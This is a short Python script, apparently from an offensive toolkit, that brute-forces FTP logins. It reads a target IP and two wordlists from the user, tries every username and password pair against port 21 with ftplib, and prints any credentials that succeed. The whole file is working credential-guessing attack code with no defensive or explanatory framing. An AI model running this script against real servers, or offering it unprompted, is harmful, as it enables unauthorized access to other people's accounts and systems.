import os,sys
import ftplib

sys.path.insert(0, '../banner/banner.py') 

def bruteFTP(ip, port, user, password):
	ftp = ftplib.FTP(ip)

	try:
		ftp.login(user, password)
		ftp.quit()
		print("\033[1;37m---------------------------------------------\033[0m")
		print(" User : \033[1;31m{}\033[1;37m |\033[0m Pass : \033[1;31m{}\033[0m".format(user,password))
		print("\033[1;37m---------------------------------------------\033[0m")
	except:
	    print("=> Authentication Failed")

ip = input("\n\033[0;32mIP\033[0m Address : ")
port = 21

username_list = open(input("\033[0;32mUser(s)\033[0m  wordlist : "), 'r')
username_list = username_list.read().split('\n')	 

passwords_list = open(input("\033[0;32mPasswords\033[0m  wordlist : "), 'r',)
passwords_list = passwords_list.read().split('\n')
print(f"\033[0;32mPort\033[0m : {port}\n")		     

for u in username_list:
	for p in passwords_list:
		bruteFTP(ip,port,u,p)
